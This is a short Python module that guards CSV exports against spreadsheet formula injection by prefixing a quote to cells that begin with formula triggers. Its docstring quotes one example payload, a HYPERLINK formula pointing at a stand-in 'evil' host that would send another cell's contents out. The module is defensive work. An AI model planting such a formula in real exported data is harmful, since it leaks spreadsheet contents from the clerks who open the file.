"""Writing a cell that a spreadsheet will not run.

Every CSV Postulo writes is written to be opened in a spreadsheet, and Excel, Numbers and
LibreOffice all read a cell beginning ``=``, ``+``, ``-`` or ``@`` as a *formula* rather
than as text. That would be a curiosity if the values were the person's own; they are not.
A posting captured from a stranger's page supplies its own title and company name, and the
report those land in exists to be handed to an employment office -- so a posting titled
``=HYPERLINK("https://evil/?"&A2,"Open")`` runs on the clerk's machine, against whatever
else their sheet holds, the moment they open the file (#218).

The rule lives here and nowhere else, because a rule applied at four call sites is a rule
the fifth will not know about.
"""

from __future__ import annotations

from collections.abc import Iterable

#: A cell beginning with one of these is read as something other than text. The first four
#: introduce a formula; the tab and the carriage return are here because a reader swallows
#: a leading one and hands the character after it the first position instead.
TRIGGERS = ("=", "+", "-", "@", "\t", "\r")

#: What says "this cell is text" to every spreadsheet there is. It is also what one writes
#: itself when it saves a text cell that looks like a formula, so a file round-tripped
#: through a spreadsheet already looks like this.
GUARD = "'"


def cell(value: object) -> str:
    """One CSV cell as text, whatever a spreadsheet would otherwise make of it."""
    text = "" if value is None else str(value)
    return GUARD + text if text.startswith(TRIGGERS) else text


def row(values: Iterable[object]) -> list[str]:
    """One whole row, every cell of it neutral."""
    return [cell(value) for value in values]
